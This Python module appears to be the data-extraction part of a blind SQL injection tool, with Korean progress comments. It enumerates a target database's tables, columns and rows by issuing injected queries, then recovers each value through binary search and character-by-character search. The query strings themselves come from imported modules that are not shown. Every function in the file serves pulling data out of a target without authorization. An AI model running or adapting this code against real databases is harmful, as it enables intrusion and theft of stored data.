from attack_setting import *
from binary_search import *
from attack_query import *



class getData:
    query = attackQuerys()
    def get_tables(destination):
        
        result = tableInfo()
        # print('테이블 수 찾는 중',end="",flush=True)
        table_count = Search.binary_search(destination,getData.query.get_table_query('count'))
        print('\nnumber of table : ',table_count)
        

        for i in range(0,table_count):
            #print(f'\n{i}번째 테이블의 글자 수 찾는 중',end="",flush=True)
            length_query = getData.query.get_table_query('length',rnum=i)
            table_name_length = Search.binary_search(destination,length_query)
            #print(f'\n{i}번째 테이블의 글자 수 = {table_name_length}')

            print(f'\n{i+1}. ',end="",flush=True)
            table_name_query = getData.query.get_table_query('data',rnum=i)
            table_name = Search.letter_search(destination,table_name_query,table_name_length)
            #print(f'\n{i}번째 테이블 이름 = {table_name}')

            result.append_table(table_name)
            
        
        #print("테이블 목록 : ",result.tables)
        return result
        

    def get_columns(destination,result,table_name):

        if table_name not in result.tables:
            print("해당 테이블 명이 목록에 존재하지 않습니다.")
            return 0
        
        else:
            print(f'\n{table_name}')
            column_count = Search.binary_search(destination,getData.query.get_column_query('count',table_name=table_name))
            print(f'\nnumber of columns : {column_count}\n')
            
            for i in range(column_count):
                print(f"{i+1}. ",end="",flush=True)
                #print(f'\n{table_name} : {i}번째 컬럼의 글자 수 찾는 중',end="",flush=True)
                length_query = getData.query.get_column_query('length',table_name=table_name,rnum=i)
                column_name_length = Search.binary_search(destination,length_query)
                #print(f'\n{table_name} : {i}번째 컬럼의 글자 수 = {column_name_length}')

                #print(f'\n{table_name} : {i}번째 컬럼의 글자 찾는 중',end="",flush=True)
                column_name_query = getData.query.get_column_query('data',table_name=table_name,rnum=i)
                column_name = Search.letter_search(destination,column_name_query,column_name_length)
                #print(f'\n{table_name} : {i}번째 컬럼 이름 = {column_name}')\
                

                result.append_column(table_name=table_name,column_name=column_name)
                #print(result.columns)
                print("")
                      

    def get_datas(destination,result,table_name):
        if table_name not in result.tables:
            print("해당 테이블이 존재하지 않습니다.")
            return 0
        
        if not result.columns[table_name]:
            print("해당 테이블 내 컬럼이 존재하지 않습니다.")
            return 0
        
        else:
            #print(f"\n{table_name}")
            data_count = Search.binary_search(destination,getData.query.get_data_query('count',table_name=table_name,column_name=result.columns[table_name][0]))
            print(f'\nnumber of data : {data_count}\n')
            for i in range(data_count):
                print(f"\n{i+1}. ", end="",flush=True)
                for column_name in result.columns[table_name]:
                    print(f"{column_name} : " ,end=" ",flush=True)
                    length_query = getData.query.get_data_query('length',table_name=table_name,column_name=column_name,rnum=i)
                    data_length = Search.binary_search(destination,length_query)
                    data_name_query = getData.query.get_data_query('data',table_name=table_name,column_name=column_name,rnum=i)
                    data = Search.letter_search(destination,data_name_query,data_length)

                    result.append_datas(table_name,column_name,data)
                    print(" | " ,end="",flush=True)
                    
                print("")



    



            


